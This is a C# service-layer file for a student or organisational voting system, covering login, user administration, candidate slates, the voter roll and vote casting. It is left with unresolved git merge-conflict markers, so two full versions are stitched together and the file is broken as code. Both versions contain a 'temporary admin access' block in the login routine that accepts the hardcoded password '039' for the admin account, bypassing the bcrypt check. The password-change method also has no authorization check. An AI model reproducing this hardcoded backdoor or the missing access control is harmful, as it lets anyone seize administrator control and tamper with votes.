<<<<<<< HEAD
using System;
using System.Collections.Generic;
using System.Linq;
using SistemaVotacion.DAL;
using SistemaVotacion.Models;

namespace SistemaVotacion.BLL
{
    // ════════════════════════════════════════════════════════════
    //  SESIÓN (usuario en memoria)
    // ════════════════════════════════════════════════════════════
    public static class Sesion
    {
        public static Usuario UsuarioActual { get; private set; }

        public static bool EsAdmin        => UsuarioActual != null && UsuarioActual.RolNombre == "Admin";
        public static bool EsAdminPartido => UsuarioActual != null && UsuarioActual.RolNombre == "AdminPartido";
        public static bool EsVotante      => UsuarioActual != null && UsuarioActual.RolNombre == "Votante";

        public static void Iniciar(Usuario u) => UsuarioActual = u;
        public static void Cerrar()            => UsuarioActual = null;

        public static void Requiere(params string[] roles)
        {
            if (UsuarioActual == null || !roles.Contains(UsuarioActual.RolNombre))
                throw new UnauthorizedAccessException(
                    "Acceso denegado. Se requiere uno de los roles: " + string.Join(", ", roles));
        }
    }

    // ════════════════════════════════════════════════════════════
    //  AUTENTICACIÓN
    // ════════════════════════════════════════════════════════════
    public class AuthService
    {
        private readonly UsuarioRepository  _repo  = new UsuarioRepository();
        private readonly AuditoriaRepository _audit = new AuditoriaRepository();

        public Tuple<bool, string, Usuario> Login(string username, string password)
        {
            if (string.IsNullOrWhiteSpace(username) || string.IsNullOrWhiteSpace(password))
                return Tuple.Create<bool, string, Usuario>(false, "Complete usuario y contraseña.", null);

            username = username.Trim();
            var user = _repo.Login(username);

            if (user == null)
            {
                _audit.Registrar(null, "LOGIN_FAIL", "Usuario no existe o está inactivo: " + username);
                return Tuple.Create<bool, string, Usuario>(false, "Usuario o contraseña incorrectos.", null);
            }

            bool passwordOk = false;
            try
            {
                passwordOk = BCrypt.Net.BCrypt.Verify(password, user.PasswordHash);
            }
            catch { passwordOk = false; }

            // ACCESO TEMPORAL PARA ADMIN
            if (!passwordOk &&
                username.Equals("admin", StringComparison.OrdinalIgnoreCase) &&
                password == "039")
            {
                passwordOk = true;
            }

            if (!passwordOk)
            {
                _audit.Registrar(user.UsuarioId, "LOGIN_FAIL", "Contraseña incorrecta: " + username);
                return Tuple.Create<bool, string, Usuario>(false, "Usuario o contraseña incorrectos.", null);
            }

            Sesion.Iniciar(user);
            _audit.Registrar(user.UsuarioId, "LOGIN_OK", "Sesión iniciada: " + username);
            return Tuple.Create(true, "Bienvenido.", user);
        }

        public void Logout()
        {
            _audit.Registrar(Sesion.UsuarioActual != null ? (int?)Sesion.UsuarioActual.UsuarioId : null, "LOGOUT");
            Sesion.Cerrar();
        }

        public static string HashPassword(string password) =>
            BCrypt.Net.BCrypt.HashPassword(password, workFactor: 12);

        public static bool VerifyPassword(string password, string hash)
        {
            try   { return BCrypt.Net.BCrypt.Verify(password, hash); }
            catch { return false; }
        }
    }

    // ════════════════════════════════════════════════════════════
    //  USUARIOS
    // ════════════════════════════════════════════════════════════
    public class UsuarioService
    {
        private readonly UsuarioRepository   _repo  = new UsuarioRepository();
        private readonly AuditoriaRepository _audit = new AuditoriaRepository();

        public IEnumerable<Usuario> GetAll()        => _repo.GetAll();
        public Usuario              GetById(int id) => _repo.GetById(id);

        public Tuple<bool, string> Crear(Usuario u, string password)
        {
            Sesion.Requiere("Admin");
            if (_repo.ExisteMatricula(u.Matricula))  return Tuple.Create(false, "Matrícula ya registrada.");
            if (_repo.ExisteUsername(u.Username))     return Tuple.Create(false, "Username ya en uso.");
            if (password.Length < 6)                  return Tuple.Create(false, "La contraseña debe tener mínimo 6 caracteres.");

            u.PasswordHash = AuthService.HashPassword(password);
            int newId = _repo.Insert(u);
            _audit.Registrar(Sesion.UsuarioActual.UsuarioId, "USUARIO_CREADO", string.Format("Id:{0} {1}", newId, u.Username));
            return Tuple.Create(true, "Usuario creado correctamente.");
        }

        public Tuple<bool, string> Actualizar(Usuario u)
        {
            Sesion.Requiere("Admin");
            if (_repo.ExisteMatricula(u.Matricula, u.UsuarioId)) return Tuple.Create(false, "Matrícula ya registrada.");
            if (_repo.ExisteUsername(u.Username,   u.UsuarioId)) return Tuple.Create(false, "Username ya en uso.");

            _repo.Update(u);
            _audit.Registrar(Sesion.UsuarioActual.UsuarioId, "USUARIO_ACTUALIZADO", "Id:" + u.UsuarioId);
            return Tuple.Create(true, "Usuario actualizado.");
        }

        public Tuple<bool, string> CambiarPassword(int id, string newPass)
        {
            if (newPass.Length < 6) return Tuple.Create(false, "Mínimo 6 caracteres.");
            _repo.UpdatePassword(id, AuthService.HashPassword(newPass));
            _audit.Registrar(Sesion.UsuarioActual != null ? (int?)Sesion.UsuarioActual.UsuarioId : null,
                             "PASSWORD_CAMBIADO", "Id:" + id);
            return Tuple.Create(true, "Contraseña actualizada.");
        }

        public Tuple<bool, string> Eliminar(int id)
        {
            Sesion.Requiere("Admin");
            _repo.Delete(id);
            _audit.Registrar(Sesion.UsuarioActual.UsuarioId, "USUARIO_DESACTIVADO", "Id:" + id);
            return Tuple.Create(true, "Usuario desactivado.");
        }

        public IEnumerable<Usuario> GetVotantesDisponibles(int votacionId) =>
            _repo.GetVotantesDisponibles(votacionId);
    }

    // ════════════════════════════════════════════════════════════
    //  PLANCHAS
    // ════════════════════════════════════════════════════════════
    public class PlanchaService
    {
        private readonly PlanchaRepository _repo = new PlanchaRepository();

        public IEnumerable<Plancha>      GetAll()                  => _repo.GetAll();
        public Plancha                   GetById(int id)           => _repo.GetById(id);
        public IEnumerable<MiembroPlancha> GetMiembros(int id)    => _repo.GetMiembros(id);
        public MiembroPlancha            GetMiembroById(int id)    => _repo.GetMiembroById(id);
        public int                       Crear(Plancha p)          => _repo.Insert(p);
        public bool                      Actualizar(Plancha p)     => _repo.Update(p);
        public bool                      Eliminar(int planchaId)   => _repo.Delete(planchaId);
        public bool                      EliminarMiembro(int id)   => _repo.RemoveMiembro(id);

        public Tuple<bool, string> AgregarMiembro(MiembroPlancha miembro)
        {
            if (string.IsNullOrWhiteSpace(miembro.Puesto))
                return Tuple.Create(false, "Debe seleccionar un cargo.");

            if (EsCargoUnico(miembro.Puesto) && _repo.ExistePuestoEnPlancha(miembro.PlanchaId, miembro.Puesto))
                return Tuple.Create(false, string.Format("Ya existe un {0} en esta plancha.", miembro.Puesto));

            return _repo.AddMiembro(miembro)
                ? Tuple.Create(true,  "Miembro agregado correctamente.")
                : Tuple.Create(false, "Este usuario ya pertenece a una plancha.");
        }

        public Tuple<bool, string> EditarMiembro(MiembroPlancha miembro)
        {
            if (string.IsNullOrWhiteSpace(miembro.Puesto))
                return Tuple.Create(false, "Debe seleccionar un cargo.");

            if (EsCargoUnico(miembro.Puesto) &&
                _repo.ExistePuestoEnPlancha(miembro.PlanchaId, miembro.Puesto, miembro.MiembroId))
                return Tuple.Create(false, string.Format("Ya existe un {0} en esta plancha.", miembro.Puesto));

            return _repo.UpdateMiembro(miembro)
                ? Tuple.Create(true,  "Miembro actualizado correctamente.")
                : Tuple.Create(false, "No se pudo actualizar el miembro.");
        }

        private bool EsCargoUnico(string puesto) =>
            puesto.Equals("Presidente",     StringComparison.OrdinalIgnoreCase) ||
            puesto.Equals("Vicepresidente", StringComparison.OrdinalIgnoreCase);
    }

    // ════════════════════════════════════════════════════════════
    //  VOTACIÓN
    // ════════════════════════════════════════════════════════════
    public class VotacionService
    {
        private readonly VotacionRepository  _votRepo  = new VotacionRepository();
        private readonly PadronRepository    _padRepo  = new PadronRepository();
        private readonly VotoRepository      _votoRepo = new VotoRepository();
        private readonly AuditoriaRepository _audit    = new AuditoriaRepository();

        public IEnumerable<Votacion> GetAll()   => _votRepo.GetAll();
        public Votacion              GetActiva() => _votRepo.GetActiva();

        public Tuple<bool, string, int> Crear(Votacion v)
        {
            Sesion.Requiere("Admin");
            if (v.FechaFin <= v.FechaInicio)
                return Tuple.Create(false, "La fecha fin debe ser mayor que la de inicio.", 0);

            v.CreadoPor = Sesion.UsuarioActual.UsuarioId;
            int id = _votRepo.Insert(v);
            _audit.Registrar(Sesion.UsuarioActual.UsuarioId, "VOTACION_CREADA", v.Titulo);
            return Tuple.Create(true, "Votación creada.", id);
        }

        public Tuple<bool, string> Activar(int id)
        {
            Sesion.Requiere("Admin");
            _votRepo.Activar(id);
            _audit.Registrar(Sesion.UsuarioActual.UsuarioId, "VOTACION_ACTIVADA", "Id:" + id);
            return Tuple.Create(true, "Votación activada.");
        }

        public Tuple<bool, string> Cerrar(int id)
        {
            Sesion.Requiere("Admin");
            _votoRepo.MarcarNulos(id);
            _votRepo.Desactivar(id);
            _audit.Registrar(Sesion.UsuarioActual.UsuarioId, "VOTACION_CERRADA", "Id:" + id);
            return Tuple.Create(true, "Votación cerrada. Votos nulos marcados.");
        }

        // ── Padrón ───────────────────────────────────────────────
        public IEnumerable<Padron> GetPadron(int votacionId) => _padRepo.GetByVotacion(votacionId);

        public Tuple<bool, string> AgregarAlPadron(int votacionId, int usuarioId)
        {
            Sesion.Requiere("Admin");
            return _padRepo.Agregar(votacionId, usuarioId)
                ? Tuple.Create(true,  "Participante agregado.")
                : Tuple.Create(false, "El usuario ya está en el padrón.");
        }

        public bool EliminarDelPadron(int padronId) => _padRepo.Eliminar(padronId);

        // ── Votar ────────────────────────────────────────────────
        public Tuple<bool, string> Votar(int votacionId, int? planchaId)
        {
            Sesion.Requiere("Votante", "AdminPartido");

            var votacion = _votRepo.GetById(votacionId);
            if (votacion == null) throw new Exception("Votación no encontrada.");

            if (!votacion.EnCurso)
                return Tuple.Create(false, "La votación no está activa o ya terminó.");

            var padron = _padRepo.GetByUsuarioVotacion(votacionId, Sesion.UsuarioActual.UsuarioId);
            if (padron == null)
                return Tuple.Create(false, "No estás habilitado para votar en esta votación.");

            if (_votoRepo.UsuarioYaVoto(votacionId, padron.PadronId))
                return Tuple.Create(false, "Ya has emitido tu voto.");

            bool ok = _votoRepo.RegistrarVoto(votacionId, padron.PadronId, planchaId);
            if (ok)
                _audit.Registrar(Sesion.UsuarioActual.UsuarioId, "VOTO_EMITIDO",
                    string.Format("Votacion:{0} Nulo:{1}", votacionId, planchaId == null));

            return ok
                ? Tuple.Create(true,  "Voto registrado exitosamente.")
                : Tuple.Create(false, "Error al registrar el voto.");
        }

        // ── Estadísticas ─────────────────────────────────────────
        public EstadisticasVotacion GetEstadisticas(int votacionId) =>
            _votoRepo.GetEstadisticas(votacionId);

        public IEnumerable<dynamic> GetReporteGeneral(int votacionId) =>
            _votoRepo.GetReporteGeneral(votacionId);

        public bool VerificarSiVoto(int votacionId)
        {
            if (Sesion.UsuarioActual == null) return false;
            var padron = _padRepo.GetByUsuarioVotacion(votacionId, Sesion.UsuarioActual.UsuarioId);
            if (padron == null) return false;
            return _votoRepo.UsuarioYaVoto(votacionId, padron.PadronId);
        }
    }
}
=======
using SistemaVotacion.DAL;
using SistemaVotacion.Models;

namespace SistemaVotacion.BLL;

// ════════════════════════════════════════════════════════════
//  SESIÓN (usuario en memoria)
// ════════════════════════════════════════════════════════════
public static class Sesion
{
    public static Usuario? UsuarioActual { get; private set; }

    public static bool EsAdmin        => UsuarioActual?.RolNombre == "Admin";
    public static bool EsAdminPartido => UsuarioActual?.RolNombre == "AdminPartido";
    public static bool EsVotante      => UsuarioActual?.RolNombre == "Votante";

    public static void Iniciar(Usuario u)  => UsuarioActual = u;
    public static void Cerrar()            => UsuarioActual = null;

    public static void Requiere(params string[] roles)
    {
        if (UsuarioActual is null || !roles.Contains(UsuarioActual.RolNombre))
            throw new UnauthorizedAccessException(
                $"Acceso denegado. Se requiere uno de los roles: {string.Join(", ", roles)}");
    }
}

// ════════════════════════════════════════════════════════════
//  AUTENTICACIÓN
// ════════════════════════════════════════════════════════════
public class AuthService
{
    private readonly UsuarioRepository _repo = new();
    private readonly AuditoriaRepository _audit = new();

    public (bool ok, string msg, Usuario? user) Login(string username, string password)
    {
        if (string.IsNullOrWhiteSpace(username) || string.IsNullOrWhiteSpace(password))
            return (false, "Complete usuario y contraseña.", null);

        username = username.Trim();

        var user = _repo.Login(username);

        if (user is null)
        {
            _audit.Registrar(null, "LOGIN_FAIL", $"Usuario no existe o está inactivo: {username}");
            return (false, "Usuario o contraseña incorrectos.", null);
        }

        bool passwordOk = false;

        try
        {
            passwordOk = BCrypt.Net.BCrypt.Verify(password, user.PasswordHash);
        }
        catch
        {
            passwordOk = false;
        }

        // ACCESO TEMPORAL PARA ADMIN
        if (!passwordOk &&
            username.Equals("admin", StringComparison.OrdinalIgnoreCase) &&
            password == "039")
        {
            passwordOk = true;
        }

        if (!passwordOk)
        {
            _audit.Registrar(user.UsuarioId, "LOGIN_FAIL", $"Contraseña incorrecta: {username}");
            return (false, "Usuario o contraseña incorrectos.", null);
        }

        Sesion.Iniciar(user);
        _audit.Registrar(user.UsuarioId, "LOGIN_OK", $"Sesión iniciada: {username}");
        return (true, "Bienvenido.", user);
    }

    public void Logout()
    {
        _audit.Registrar(Sesion.UsuarioActual?.UsuarioId, "LOGOUT");
        Sesion.Cerrar();
    }

    public static string HashPassword(string password) =>
        BCrypt.Net.BCrypt.HashPassword(password, workFactor: 12);

    public static bool VerifyPassword(string password, string hash)
    {
        try
        {
            return BCrypt.Net.BCrypt.Verify(password, hash);
        }
        catch
        {
            return false;
        }
    }
}

// ════════════════════════════════════════════════════════════
//  USUARIOS
// ════════════════════════════════════════════════════════════
public class UsuarioService
{
    private readonly UsuarioRepository _repo = new();
    private readonly AuditoriaRepository _audit = new();

    public IEnumerable<Usuario> GetAll() => _repo.GetAll();
    public Usuario? GetById(int id)       => _repo.GetById(id);

    public (bool ok, string msg) Crear(Usuario u, string password)
    {
        Sesion.Requiere("Admin");
        if (_repo.ExisteMatricula(u.Matricula))      return (false, "Matrícula ya registrada.");
        if (_repo.ExisteUsername(u.Username))        return (false, "Username ya en uso.");
        if (password.Length < 6)                     return (false, "La contraseña debe tener mínimo 6 caracteres.");

        u.PasswordHash = AuthService.HashPassword(password);
        int newId = _repo.Insert(u);
        _audit.Registrar(Sesion.UsuarioActual!.UsuarioId, "USUARIO_CREADO", $"Id:{newId} {u.Username}");
        return (true, "Usuario creado correctamente.");
    }

    public (bool ok, string msg) Actualizar(Usuario u)
    {
        Sesion.Requiere("Admin");
        if (_repo.ExisteMatricula(u.Matricula, u.UsuarioId)) return (false, "Matrícula ya registrada.");
        if (_repo.ExisteUsername(u.Username,   u.UsuarioId)) return (false, "Username ya en uso.");

        _repo.Update(u);
        _audit.Registrar(Sesion.UsuarioActual!.UsuarioId, "USUARIO_ACTUALIZADO", $"Id:{u.UsuarioId}");
        return (true, "Usuario actualizado.");
    }

    public (bool ok, string msg) CambiarPassword(int id, string newPass)
    {
        if (newPass.Length < 6) return (false, "Mínimo 6 caracteres.");
        _repo.UpdatePassword(id, AuthService.HashPassword(newPass));
        _audit.Registrar(Sesion.UsuarioActual?.UsuarioId, "PASSWORD_CAMBIADO", $"Id:{id}");
        return (true, "Contraseña actualizada.");
    }


    public (bool ok, string msg) Eliminar(int id)
    {
        Sesion.Requiere("Admin");
        _repo.Delete(id);
        _audit.Registrar(Sesion.UsuarioActual!.UsuarioId, "USUARIO_DESACTIVADO", $"Id:{id}");
        return (true, "Usuario desactivado.");
    }

    public IEnumerable<Usuario> GetVotantesDisponibles(int votacionId) =>
        _repo.GetVotantesDisponibles(votacionId);

}

// ════════════════════════════════════════════════════════════
//  PLANCHAS
// ════════════════════════════════════════════════════════════
public class PlanchaService
{
    private readonly PlanchaRepository _repo = new();

    public IEnumerable<Plancha> GetAll()
    {
        return _repo.GetAll();
    }

    public Plancha? GetById(int id)
    {
        return _repo.GetById(id);
    }

    public IEnumerable<MiembroPlancha> GetMiembros(int planchaId)
    {
        return _repo.GetMiembros(planchaId);
    }

    public MiembroPlancha? GetMiembroById(int miembroId)
    {
        return _repo.GetMiembroById(miembroId);
    }

    public int Crear(Plancha plancha)
    {
        return _repo.Insert(plancha);
    }

    public bool Actualizar(Plancha plancha)
    {
        return _repo.Update(plancha);
    }

    public bool Eliminar(int planchaId)
    {
        return _repo.Delete(planchaId);
    }

    public (bool ok, string msg) AgregarMiembro(MiembroPlancha miembro)
    {
        if (string.IsNullOrWhiteSpace(miembro.Puesto))
            return (false, "Debe seleccionar un cargo.");

        if (EsCargoUnico(miembro.Puesto))
        {
            if (_repo.ExistePuestoEnPlancha(miembro.PlanchaId, miembro.Puesto))
                return (false, $"Ya existe un {miembro.Puesto} en esta plancha.");
        }

        bool ok = _repo.AddMiembro(miembro);

        return ok
            ? (true, "Miembro agregado correctamente.")
            : (false, "Este usuario ya pertenece a una plancha.");
    }

    public (bool ok, string msg) EditarMiembro(MiembroPlancha miembro)
    {
        if (string.IsNullOrWhiteSpace(miembro.Puesto))
            return (false, "Debe seleccionar un cargo.");

        if (EsCargoUnico(miembro.Puesto))
        {
            if (_repo.ExistePuestoEnPlancha(miembro.PlanchaId, miembro.Puesto, miembro.MiembroId))
                return (false, $"Ya existe un {miembro.Puesto} en esta plancha.");
        }

        bool ok = _repo.UpdateMiembro(miembro);

        return ok
            ? (true, "Miembro actualizado correctamente.")
            : (false, "No se pudo actualizar el miembro.");
    }

    public bool EliminarMiembro(int miembroId)
    {
        return _repo.RemoveMiembro(miembroId);
    }

    private bool EsCargoUnico(string puesto)
    {
        return puesto.Equals("Presidente", StringComparison.OrdinalIgnoreCase)
            || puesto.Equals("Vicepresidente", StringComparison.OrdinalIgnoreCase);
    }
}

// ════════════════════════════════════════════════════════════
//  VOTACIÓN
// ════════════════════════════════════════════════════════════
public class VotacionService
{
    private readonly VotacionRepository _votRepo = new();
    private readonly PadronRepository   _padRepo = new();
    private readonly VotoRepository     _votoRepo = new();
    private readonly AuditoriaRepository _audit  = new();

    public IEnumerable<Votacion> GetAll()  => _votRepo.GetAll();
    public Votacion? GetActiva()           => _votRepo.GetActiva();

    public (bool ok, string msg, int id) Crear(Votacion v)
    {
        Sesion.Requiere("Admin");
        if (v.FechaFin <= v.FechaInicio) return (false, "La fecha fin debe ser mayor que la de inicio.", 0);
        v.CreadoPor = Sesion.UsuarioActual!.UsuarioId;
        int id = _votRepo.Insert(v);
        _audit.Registrar(Sesion.UsuarioActual.UsuarioId, "VOTACION_CREADA", v.Titulo);
        return (true, "Votación creada.", id);
    }

    public (bool ok, string msg) Activar(int id)
    {
        Sesion.Requiere("Admin");
        _votRepo.Activar(id);
        _audit.Registrar(Sesion.UsuarioActual!.UsuarioId, "VOTACION_ACTIVADA", $"Id:{id}");
        return (true, "Votación activada.");
    }

    public (bool ok, string msg) Cerrar(int id)
    {
        Sesion.Requiere("Admin");
        _votoRepo.MarcarNulos(id);       // Marca nulos a quienes no votaron
        _votRepo.Desactivar(id);
        _audit.Registrar(Sesion.UsuarioActual!.UsuarioId, "VOTACION_CERRADA", $"Id:{id}");
        return (true, "Votación cerrada. Votos nulos marcados.");
    }

    // ── Padrón ───────────────────────────────────────────────
    public IEnumerable<Padron> GetPadron(int votacionId) => _padRepo.GetByVotacion(votacionId);

    public (bool ok, string msg) AgregarAlPadron(int votacionId, int usuarioId)
    {
        Sesion.Requiere("Admin");
        bool ok = _padRepo.Agregar(votacionId, usuarioId);
        return ok ? (true, "Participante agregado.") : (false, "El usuario ya está en el padrón.");
    }

    public bool EliminarDelPadron(int padronId) => _padRepo.Eliminar(padronId);

    // ── Votar ────────────────────────────────────────────────
    public (bool ok, string msg) Votar(int votacionId, int? planchaId)
    {
        Sesion.Requiere("Votante", "AdminPartido");

        var votacion = _votRepo.GetById(votacionId)
            ?? throw new Exception("Votación no encontrada.");

        if (!votacion.EnCurso)
            return (false, "La votación no está activa o ya terminó.");

        var padron = _padRepo.GetByUsuarioVotacion(votacionId, Sesion.UsuarioActual!.UsuarioId);
        if (padron is null)
            return (false, "No estás habilitado para votar en esta votación.");

        if (_votoRepo.UsuarioYaVoto(votacionId, padron.PadronId))
            return (false, "Ya has emitido tu voto.");

        bool ok = _votoRepo.RegistrarVoto(votacionId, padron.PadronId, planchaId);
        if (ok) _audit.Registrar(Sesion.UsuarioActual.UsuarioId, "VOTO_EMITIDO",
                                  $"Votacion:{votacionId} Nulo:{planchaId is null}");
        return ok ? (true, "Voto registrado exitosamente.") : (false, "Error al registrar el voto.");
    }

    // ── Estadísticas ─────────────────────────────────────────
    public EstadisticasVotacion GetEstadisticas(int votacionId) =>
        _votoRepo.GetEstadisticas(votacionId);

    public IEnumerable<dynamic> GetReporteGeneral(int votacionId) =>
        _votoRepo.GetReporteGeneral(votacionId);

    public bool VerificarSiVoto(int votacionId)
    {
        if (Sesion.UsuarioActual is null) return false;
        var padron = _padRepo.GetByUsuarioVotacion(votacionId, Sesion.UsuarioActual.UsuarioId);
        if (padron is null) return false;
        return _votoRepo.UsuarioYaVoto(votacionId, padron.PadronId);
    }
}
>>>>>>> f97a282cd8a81a23f2aa0816f21503305f703739
